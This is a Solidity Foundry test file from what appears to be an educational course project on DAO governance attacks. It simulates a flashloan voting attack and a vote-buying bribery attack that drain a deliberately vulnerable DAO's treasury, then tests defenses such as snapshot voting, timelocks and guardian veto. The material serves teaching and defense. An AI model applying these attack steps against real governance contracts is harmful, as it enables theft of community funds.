// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/solution/GovernanceAttackSolution.sol";

/**
 * @title Project 39 Tests: Governance Attack Simulation
 * @notice Comprehensive tests demonstrating governance attacks and defenses
 */
contract GovernanceAttackTest is Test {
    GovernanceTokenSolution public govToken;
    VulnerableDAOSolution public vulnerableDAO;
    SafeDAOSolution public safeDAO;
    SimpleFlashloanProviderSolution public flashloanProvider;
    FlashloanGovernanceAttackerSolution public attacker;
    MaliciousTreasurySolution public treasury;
    VoteBuyingAttackerSolution public voteBuyer;

    address public deployer = makeAddr("deployer");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    address public charlie = makeAddr("charlie");
    address public attacker_eoa = makeAddr("attacker_eoa");
    address public guardian = makeAddr("guardian");

    // Test parameters
    uint256 constant INITIAL_SUPPLY = 1_000_000 * 1e18;
    uint256 constant FLASHLOAN_LIQUIDITY = 500_000 * 1e18;
    uint256 constant TREASURY_FUNDS = 100 ether;

    function setUp() public {
        vm.startPrank(deployer);

        // Deploy governance token
        govToken = new GovernanceTokenSolution();

        // Deploy DAOs
        vulnerableDAO = new VulnerableDAOSolution(address(govToken));
        safeDAO = new SafeDAOSolution(address(govToken), guardian);

        // Deploy flashloan provider
        flashloanProvider = new SimpleFlashloanProviderSolution(address(govToken));

        // Deploy attacker contract
        attacker = new FlashloanGovernanceAttackerSolution(
            address(vulnerableDAO),
            address(flashloanProvider),
            address(govToken)
        );

        // Deploy vote buyer
        voteBuyer = new VoteBuyingAttackerSolution(address(govToken), address(vulnerableDAO));

        // Deploy treasury
        treasury = new MaliciousTreasurySolution();

        // Setup: Distribute tokens
        govToken.transfer(alice, 50_000 * 1e18);
        govToken.transfer(bob, 30_000 * 1e18);
        govToken.transfer(charlie, 20_000 * 1e18);

        // Fund flashloan provider
        govToken.approve(address(flashloanProvider), FLASHLOAN_LIQUIDITY);
        flashloanProvider.depositTokens(FLASHLOAN_LIQUIDITY);

        // Fund treasury
        vm.deal(address(treasury), TREASURY_FUNDS);

        // Fund DAOs for proposal execution
        vm.deal(address(vulnerableDAO), 10 ether);
        vm.deal(address(safeDAO), 10 ether);

        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                        FLASHLOAN ATTACK TESTS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test flashloan governance attack on vulnerable DAO
     * @dev This demonstrates the critical vulnerability of using balanceOf for voting
     */
    function testFlashloanGovernanceAttack() public {
        console.log("\n=== FLASHLOAN GOVERNANCE ATTACK ===");

        // Step 1: Create malicious proposal (as attacker_eoa)
        vm.startPrank(attacker_eoa);

        // Attacker needs some tokens to create proposal
        vm.startPrank(deployer);
        govToken.transfer(attacker_eoa, 1_000 * 1e18);
        vm.stopPrank();

        vm.startPrank(attacker_eoa);

        // Create proposal to drain treasury
        bytes memory drainData = abi.encodeWithSignature(
            "drainFunds(address)",
            attacker_eoa
        );

        uint256 proposalId = vulnerableDAO.propose(
            address(treasury),
            0,
            drainData,
            "Legitimate proposal (not really)"
        );

        console.log("Proposal created:", proposalId);
        vm.stopPrank();

        // Step 2: Wait for voting to start
        vm.roll(block.number + 11); // Past voting delay

        // Step 3: Execute flashloan attack
        console.log("\nBefore attack:");
        console.log("Attacker token balance:", govToken.balanceOf(address(attacker)));
        console.log("Treasury balance:", address(treasury).balance / 1 ether, "ETH");

        uint256 flashloanAmount = 200_000 * 1e18; // Borrow 200k tokens

        vm.startPrank(attacker_eoa);
        attacker.attack(proposalId, true, flashloanAmount);
        vm.stopPrank();

        console.log("\nAfter attack (flashloan returned):");
        console.log("Attacker token balance:", govToken.balanceOf(address(attacker)));

        // Verify vote was cast with flashloaned tokens
        (,,,uint256 forVotes,,,,,,,,) = vulnerableDAO.proposals(proposalId);
        console.log("Votes cast:", forVotes / 1e18);
        assertEq(forVotes, flashloanAmount, "Votes should match flashloan amount");

        // Step 4: Wait for voting to end
        vm.roll(block.number + 101);

        // Step 5: Execute malicious proposal
        vm.startPrank(attacker_eoa);
        vulnerableDAO.execute(proposalId);
        vm.stopPrank();

        console.log("\nAfter execution:");
        console.log("Attacker ETH balance:", attacker_eoa.balance / 1 ether, "ETH");
        console.log("Treasury balance:", address(treasury).balance / 1 ether, "ETH");

        // Verify treasury was drained
        assertEq(address(treasury).balance, 0, "Treasury should be drained");
        assertEq(attacker_eoa.balance, TREASURY_FUNDS, "Attacker should have treasury funds");

        console.log("\n💀 ATTACK SUCCESSFUL - Treasury drained with flashloan!");
    }

    /**
     * @notice Test that flashloan attack fails against SafeDAO
     * @dev SafeDAO uses snapshot voting, making flashloan attacks impossible
     */
    function testFlashloanAttackFailsAgainstSafeDAO() public {
        console.log("\n=== FLASHLOAN ATTACK vs SAFE DAO ===");

        // Give attacker tokens to create proposal
        vm.startPrank(deployer);
        govToken.transfer(attacker_eoa, 15_000 * 1e18); // Need 10k for threshold
        vm.stopPrank();

        // Create proposal
        vm.startPrank(attacker_eoa);

        bytes memory drainData = abi.encodeWithSignature(
            "drainFunds(address)",
            attacker_eoa
        );

        uint256 proposalId = safeDAO.propose(
            address(treasury),
            0,
            drainData,
            "Malicious proposal"
        );

        vm.stopPrank();

        // Wait for voting to start
        vm.roll(block.number + 11);

        // Try to use flashloan to vote
        vm.startPrank(attacker_eoa);

        // This should fail because SafeDAO uses snapshot voting
        // At snapshot time, attacker had 15k tokens
        // Flashloan gives temporary tokens that don't count
        uint256 flashloanAmount = 200_000 * 1e18;

        // Deploy new attacker for SafeDAO
        FlashloanGovernanceAttackerSolution safeAttacker = new FlashloanGovernanceAttackerSolution(
            address(safeDAO),
            address(flashloanProvider),
            address(govToken)
        );

        // Try attack - this will succeed in casting vote, but with 0 voting power
        vm.expectRevert("No voting power at snapshot");
        safeAttacker.attack(proposalId, true, flashloanAmount);

        console.log("\n✅ ATTACK BLOCKED - Snapshot voting prevented flashloan!");
    }

    /*//////////////////////////////////////////////////////////////
                        VOTE DELEGATION TESTS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test vote delegation mechanics
     */
    function testVoteDelegation() public {
        console.log("\n=== VOTE DELEGATION TEST ===");

        // Alice delegates to Bob
        vm.prank(alice);
        govToken.delegate(bob);

        // Bob now has his own tokens + Alice's delegated votes
        uint256 bobVotes = govToken.getVotes(bob);
        console.log("Bob's voting power after delegation:", bobVotes / 1e18);

        uint256 expected = 30_000 * 1e18 + 50_000 * 1e18; // Bob's + Alice's
        assertEq(bobVotes, expected, "Bob should have combined voting power");

        console.log("✅ Delegation working correctly");
    }

    /**
     * @notice Test vote buying attack through delegation
     */
    function testVoteBuyingAttack() public {
        console.log("\n=== VOTE BUYING ATTACK ===");

        // Fund vote buyer with ETH for bribes
        vm.deal(address(voteBuyer), 10 ether);

        // Vote buyer offers bribes
        vm.startPrank(address(voteBuyer));
        voteBuyer.offerBribe{value: 1 ether}(alice, 1 ether);
        voteBuyer.offerBribe{value: 0.5 ether}(bob, 0.5 ether);
        vm.stopPrank();

        // Alice and Bob accept bribes and delegate
        uint256 aliceBalanceBefore = alice.balance;
        vm.prank(alice);
        voteBuyer.acceptBribeAndDelegate();

        uint256 bobBalanceBefore = bob.balance;
        vm.prank(bob);
        voteBuyer.acceptBribeAndDelegate();

        // Verify bribes were paid
        assertEq(alice.balance - aliceBalanceBefore, 1 ether);
        assertEq(bob.balance - bobBalanceBefore, 0.5 ether);

        // Vote buyer now has massive voting power
        uint256 buyerVotes = govToken.getVotes(address(voteBuyer));
        console.log("Vote buyer's accumulated power:", buyerVotes / 1e18);

        uint256 expectedVotes = 50_000 * 1e18 + 30_000 * 1e18; // Alice + Bob
        assertEq(buyerVotes, expectedVotes);

        // Create proposal (deployer creates)
        vm.startPrank(deployer);
        bytes memory data = abi.encodeWithSignature("drainFunds(address)", address(voteBuyer));
        uint256 proposalId = vulnerableDAO.propose(address(treasury), 0, data, "Bought proposal");
        vm.stopPrank();

        // Wait for voting
        vm.roll(block.number + 11);

        // Vote buyer uses accumulated power
        vm.prank(deployer);
        voteBuyer.voteWithBoughtPower(proposalId, true);

        (,,,uint256 forVotes,,,,,,,,) = vulnerableDAO.proposals(proposalId);
        console.log("Votes cast with bought power:", forVotes / 1e18);

        console.log("✅ Vote buying successful - attacker accumulated delegated power");
    }

    /*//////////////////////////////////////////////////////////////
                        QUORUM MANIPULATION TESTS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test quorum requirement
     */
    function testQuorumNotReached() public {
        console.log("\n=== QUORUM TEST ===");

        // Create proposal
        vm.startPrank(deployer);
        bytes memory data = "";
        uint256 proposalId = vulnerableDAO.propose(address(this), 0, data, "Test proposal");
        vm.stopPrank();

        // Wait for voting
        vm.roll(block.number + 11);

        // Alice votes (50k tokens - below 100k quorum)
        vm.prank(alice);
        vulnerableDAO.castVote(proposalId, true);

        // Check quorum not reached
        bool quorum = vulnerableDAO.hasReachedQuorum(proposalId);
        assertFalse(quorum, "Quorum should not be reached");

        // End voting
        vm.roll(block.number + 101);

        // Try to execute - should fail
        vm.expectRevert("Quorum not reached");
        vulnerableDAO.execute(proposalId);

        console.log("✅ Quorum requirement enforced");
    }

    /**
     * @notice Test quorum reached with multiple voters
     */
    function testQuorumReached() public {
        // Create proposal
        vm.startPrank(deployer);
        bytes memory data = "";
        uint256 proposalId = vulnerableDAO.propose(address(this), 0, data, "Test proposal");
        vm.stopPrank();

        // Wait for voting
        vm.roll(block.number + 11);

        // Multiple voters
        vm.prank(alice);
        vulnerableDAO.castVote(proposalId, true);

        vm.prank(bob);
        vulnerableDAO.castVote(proposalId, true);

        vm.prank(charlie);
        vulnerableDAO.castVote(proposalId, true);

        // Total: 50k + 30k + 20k = 100k (meets quorum)
        bool quorum = vulnerableDAO.hasReachedQuorum(proposalId);
        assertTrue(quorum, "Quorum should be reached");
    }

    /*//////////////////////////////////////////////////////////////
                        TIMELOCK TESTS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test that SafeDAO enforces timelock
     */
    function testTimelockEnforced() public {
        console.log("\n=== TIMELOCK TEST ===");

        // Give alice enough tokens for SafeDAO threshold
        vm.prank(deployer);
        govToken.transfer(alice, 60_000 * 1e18); // Alice now has 110k

        // Alice delegates to herself to get voting power
        vm.prank(alice);
        govToken.delegate(alice);

        // Wait a block for delegation checkpoint
        vm.roll(block.number + 1);

        // Create proposal
        vm.startPrank(alice);
        bytes memory data = "";
        uint256 proposalId = safeDAO.propose(address(this), 0, data, "Test proposal");
        vm.stopPrank();

        // Wait for voting
        vm.roll(block.number + 11);

        // Vote
        vm.prank(alice);
        safeDAO.castVote(proposalId, true);

        // Bob also needs to delegate and vote for quorum
        vm.prank(bob);
        govToken.delegate(bob);
        vm.roll(block.number + 1);

        vm.prank(bob);
        safeDAO.castVote(proposalId, true);

        // Charlie too
        vm.prank(charlie);
        govToken.delegate(charlie);
        vm.roll(block.number + 1);

        vm.prank(charlie);
        safeDAO.castVote(proposalId, true);

        // End voting
        vm.roll(block.number + 101);

        // Queue proposal
        safeDAO.queue(proposalId);

        // Try to execute immediately - should fail
        vm.expectRevert("Timelock not expired");
        safeDAO.execute(proposalId);

        console.log("⏰ Timelock enforced - cannot execute immediately");

        // Fast forward time (not just blocks)
        vm.warp(block.timestamp + 172800); // 2 days

        // Now execution should work
        safeDAO.execute(proposalId);

        console.log("✅ Execution successful after timelock period");
    }

    /*//////////////////////////////////////////////////////////////
                        GUARDIAN VETO TESTS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test guardian can veto malicious proposals
     */
    function testGuardianVeto() public {
        console.log("\n=== GUARDIAN VETO TEST ===");

        // Setup like timelock test
        vm.prank(deployer);
        govToken.transfer(alice, 200_000 * 1e18);

        vm.prank(alice);
        govToken.delegate(alice);
        vm.roll(block.number + 1);

        // Create malicious proposal
        vm.prank(alice);
        bytes memory drainData = abi.encodeWithSignature("drainFunds(address)", alice);
        uint256 proposalId = safeDAO.propose(address(treasury), 0, drainData, "Drain treasury");

        // Vote
        vm.roll(block.number + 11);
        vm.prank(alice);
        safeDAO.castVote(proposalId, true);

        // End voting
        vm.roll(block.number + 101);

        // Guardian vetoes before queueing
        vm.prank(guardian);
        safeDAO.veto(proposalId);

        // Try to queue - should fail
        vm.expectRevert("Proposal vetoed");
        safeDAO.queue(proposalId);

        console.log("✅ Guardian successfully vetoed malicious proposal");
    }

    /*//////////////////////////////////////////////////////////////
                        PROPOSAL STATE TESTS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test various proposal states
     */
    function testProposalStates() public {
        console.log("\n=== PROPOSAL STATES TEST ===");

        vm.startPrank(deployer);
        bytes memory data = "";
        uint256 proposalId = vulnerableDAO.propose(address(this), 0, data, "Test");
        vm.stopPrank();

        // Initial state: Pending
        string memory state = vulnerableDAO.state(proposalId);
        console.log("Initial state:", state);
        assertEq(state, "Pending");

        // After voting delay: Active
        vm.roll(block.number + 11);
        state = vulnerableDAO.state(proposalId);
        console.log("After delay:", state);
        assertEq(state, "Active");

        // After voting ends without votes: Quorum Not Reached
        vm.roll(block.number + 101);
        state = vulnerableDAO.state(proposalId);
        console.log("After voting (no votes):", state);
        assertEq(state, "Quorum Not Reached");
    }

    /*//////////////////////////////////////////////////////////////
                        EDGE CASE TESTS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test cannot vote twice
     */
    function testCannotVoteTwice() public {
        vm.startPrank(deployer);
        uint256 proposalId = vulnerableDAO.propose(address(this), 0, "", "Test");
        vm.stopPrank();

        vm.roll(block.number + 11);

        vm.startPrank(alice);
        vulnerableDAO.castVote(proposalId, true);

        vm.expectRevert("Already voted");
        vulnerableDAO.castVote(proposalId, false);
        vm.stopPrank();
    }

    /**
     * @notice Test cannot execute failed proposal
     */
    function testCannotExecuteFailedProposal() public {
        vm.startPrank(deployer);
        uint256 proposalId = vulnerableDAO.propose(address(this), 0, "", "Test");
        vm.stopPrank();

        vm.roll(block.number + 11);

        // Vote against
        vm.prank(alice);
        vulnerableDAO.castVote(proposalId, false);

        vm.prank(bob);
        vulnerableDAO.castVote(proposalId, false);

        vm.prank(charlie);
        vulnerableDAO.castVote(proposalId, false);

        vm.roll(block.number + 101);

        vm.expectRevert("Proposal failed");
        vulnerableDAO.execute(proposalId);
    }

    /**
     * @notice Test proposal value limit in SafeDAO
     */
    function testProposalValueLimit() public {
        vm.prank(deployer);
        govToken.transfer(alice, 200_000 * 1e18);

        vm.prank(alice);
        govToken.delegate(alice);
        vm.roll(block.number + 1);

        vm.startPrank(alice);
        bytes memory data = "";

        // Try to create proposal with too much value
        vm.expectRevert("Proposal value too high");
        safeDAO.propose(address(this), 101 ether, data, "Too much");

        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                        DEMONSTRATION TESTS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Full attack demonstration
     */
    function testFullAttackDemonstration() public {
        console.log("\n========================================");
        console.log("FULL GOVERNANCE ATTACK DEMONSTRATION");
        console.log("========================================");

        console.log("\n1. SETUP:");
        console.log("   - Treasury has", TREASURY_FUNDS / 1 ether, "ETH");
        console.log("   - Flashloan pool has", FLASHLOAN_LIQUIDITY / 1e18, "GOV tokens");
        console.log("   - Attacker has minimal tokens");

        // Step 1: Attacker creates malicious proposal
        console.log("\n2. ATTACKER CREATES MALICIOUS PROPOSAL:");

        vm.startPrank(deployer);
        govToken.transfer(attacker_eoa, 1_000 * 1e18);
        vm.stopPrank();

        vm.startPrank(attacker_eoa);
        bytes memory drainData = abi.encodeWithSignature("drainFunds(address)", attacker_eoa);
        uint256 proposalId = vulnerableDAO.propose(
            address(treasury),
            0,
            drainData,
            "Community fund distribution (totally legit)"
        );
        console.log("   - Proposal ID:", proposalId);
        vm.stopPrank();

        // Step 2: Wait for voting
        console.log("\n3. WAITING FOR VOTING PERIOD...");
        vm.roll(block.number + 11);

        // Step 3: Execute flashloan attack
        console.log("\n4. EXECUTING FLASHLOAN ATTACK:");
        console.log("   - Borrowing 400,000 GOV tokens");
        console.log("   - Voting with borrowed tokens");
        console.log("   - Returning tokens in same transaction");

        uint256 attackAmount = 400_000 * 1e18;
        vm.prank(attacker_eoa);
        attacker.attack(proposalId, true, attackAmount);

        (,,,uint256 forVotes,,,,,,,,) = vulnerableDAO.proposals(proposalId);
        console.log("   - Votes recorded:", forVotes / 1e18);
        console.log("   - Attacker current balance:", govToken.balanceOf(address(attacker)) / 1e18);

        // Step 4: Wait for voting to end
        console.log("\n5. WAITING FOR VOTING TO END...");
        vm.roll(block.number + 101);

        // Step 5: Execute malicious proposal
        console.log("\n6. EXECUTING MALICIOUS PROPOSAL:");
        uint256 attackerBalanceBefore = attacker_eoa.balance;

        vm.prank(attacker_eoa);
        vulnerableDAO.execute(proposalId);

        uint256 stolen = attacker_eoa.balance - attackerBalanceBefore;
        console.log("   - Funds stolen:", stolen / 1 ether, "ETH");
        console.log("   - Treasury remaining:", address(treasury).balance);

        console.log("\n========================================");
        console.log("ATTACK COMPLETE");
        console.log("========================================");
        console.log("Attacker stole", stolen / 1 ether, "ETH using borrowed tokens!");
        console.log("The flashloan was repaid, but votes persisted.");
        console.log("This is why snapshot voting is CRITICAL.");
    }

    receive() external payable {}
}
